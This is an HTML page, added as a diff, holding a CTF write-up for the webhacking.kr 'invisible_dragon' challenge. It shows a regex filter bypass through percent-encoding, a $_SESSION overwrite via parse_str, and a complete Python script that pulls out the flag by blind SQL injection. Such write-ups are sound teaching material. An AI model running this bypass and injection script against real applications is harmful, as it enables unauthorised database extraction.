@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/CTF_writeups/assets/css/style.css?v=6aacf4c090fc5e966ec687925a0bf39a46c3a14c">
+    <link rel="shortcut icon" type="image/x-icon" href="/CTF_writeups/favicon.ico">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>invisible_dragon | Avishai’s CTF Writeups</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="invisible_dragon" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="…" />
+<meta property="og:description" content="…" />
+<link rel="canonical" href="http://localhost:4000/CTF_writeups/webhacking.kr/invisible_dragon.html" />
+<meta property="og:url" content="http://localhost:4000/CTF_writeups/webhacking.kr/invisible_dragon.html" />
+<meta property="og:site_name" content="Avishai’s CTF Writeups" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="invisible_dragon" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"…","headline":"invisible_dragon","url":"http://localhost:4000/CTF_writeups/webhacking.kr/invisible_dragon.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/CTF_writeups/">
+          <h1>Avishai's CTF Writeups</h1>
+        </a>
+        <h2>...</h2>
+
+        <section id="downloads">
+          
+          <a href="https://github.com/avishaigonen123/CTF_writeups" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h1 id="webhacking-invisible-dragon-solution">Webhacking Invisible Dragon Solution</h1>
+
+<p>Here we can bypass this:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/session/isUD'</span><span class="p">,</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'QUERY_STRING'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="k">exit</span><span class="p">(</span><span class="s1">'not allowed'</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>by inject our payload: <code class="language-plaintext highlighter-rouge">_SESS%49ON[format]</code> <em>I =&gt; %49</em>
+Then, it will override:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">parse_str</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'QUERY_STRING'</span><span class="p">],</span> <span class="nv">$arr</span><span class="p">);</span>
+<span class="k">foreach</span> <span class="p">(</span><span class="nv">$arr</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$$key</span> <span class="o">=</span> <span class="nv">$value</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>And by this way, we can inject our own: <code class="language-plaintext highlighter-rouge">_SESSION[format]</code>.</p>
+
+<p>Next, we will build our payload for Blind SQLi:
+<code class="language-plaintext highlighter-rouge">select * from prob_invisible_dragon where convert(secret,char(1))='F'</code>
+Where each time we find the character, and by this way leak the flag.</p>
+
+<p><img src="/CTF_writeups/webhacking.kr/images/invisible_dragon.png" alt="FLAG image" />
+So, let’s write our script: [invisible_dragon.py]</p>
+<pre><code class="language-scripts/invisible_dragon.py">import asyncio
+import aiohttp
+from yarl import URL
+
+def encode_all(string):
+    return "".join("%{0:0&gt;2x}".format(ord(char)) for char in string)
+
+URL_BASE = "http://webhacking.kr:10016/"
+SESS_ID = "jl75lgpfhd5tibe80ebtki2b"
+
+semaphore = asyncio.Semaphore(5)  # Limit concurrent requests
+
+async def fetch(session, payload):
+    async with semaphore:
+        # Fully encode the key name _SESSION[format]
+        encoded_key = encode_all("_SESSION[format]")  # This will be percent-encoded key
+
+        # Construct raw query string manually
+        query_string = (
+            f"{encoded_key}=convert(%s,char({len(payload)}))"
+            f"&amp;column=secret&amp;keyword={payload}"
+        )
+
+        url = URL(f"{URL_BASE}?{query_string}", encoded=True)
+
+        timeout = aiohttp.ClientTimeout(total=10)
+        try:
+            async with session.get(url, timeout=timeout, cookies={"PHPSESSID": SESS_ID}) as response:
+                text = await response.text()
+                # print("URL:", response.url)
+                # print(f"Status: {response.status} | Payload: {payload}")
+                return text
+        except asyncio.TimeoutError:
+            return "timeout"
+
+async def main():
+    secret = ""
+    character_set = "_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}-?"  # Custom char set
+
+    async with aiohttp.ClientSession() as session:
+        while not secret.endswith("}"):
+            tasks = []
+            for c in character_set:
+                payload = secret + c
+                tasks.append(fetch(session, payload))
+
+            responses = await asyncio.gather(*tasks)
+
+            for index, response in enumerate(responses):
+                if "Search 1!" in response:
+                    secret += character_set[index]
+                    print(f"Found char: {character_set[index]} =&gt; {secret}")
+                    break
+            else:
+                print("No character matched. Breaking.")
+                break
+
+if __name__ == "__main__":
+    asyncio.run(main())
+
+</code></pre>
+
+<p><strong>Flag:</strong> <strong><em><code class="language-plaintext highlighter-rouge">FLAG{recycle_reuse_ecyce}</code></em></strong></p>
+
+
+      </section>
+    </div>
+  </body>
+</html>
